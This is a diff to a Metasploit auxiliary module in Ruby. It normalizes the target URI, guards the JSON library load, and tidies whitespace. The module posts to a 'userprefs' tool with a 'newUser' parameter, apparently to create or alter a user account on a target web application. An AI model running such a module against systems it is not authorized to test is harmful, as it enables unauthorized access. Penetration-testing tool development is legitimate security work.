@@ -6,7 +6,6 @@
 ##
 
 require 'msf/core'
-require 'json'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -45,11 +44,11 @@ class Metasploit3 < Msf::Auxiliary
 			], self.class)
 	end
 
-
 	def run
+		uri = normalize_uri(target_uri.path)
 		res = send_request_cgi({
 			'method'    => 'POST',
-			'uri'       => target_uri.path,
+			'uri'       => uri,
 			'vars_post' => {
 				'tool'              => 'userprefs',
 				'newUser'           => datastore['USERNAME'],
@@ -60,6 +59,13 @@ class Metasploit3 < Msf::Auxiliary
 
 		if not res
 			print_error("No response from server")
+			return
+		end
+
+		begin
+			require 'json'
+		rescue LoadError
+			print_error("Json is not available on your machine")
 			return
 		end
 
@@ -78,7 +84,6 @@ class Metasploit3 < Msf::Auxiliary
 		rescue JSON::ParserError
 			print_error("Unable to parse JSON")
 			print_line(res.body)
-
 		end
 	end
 
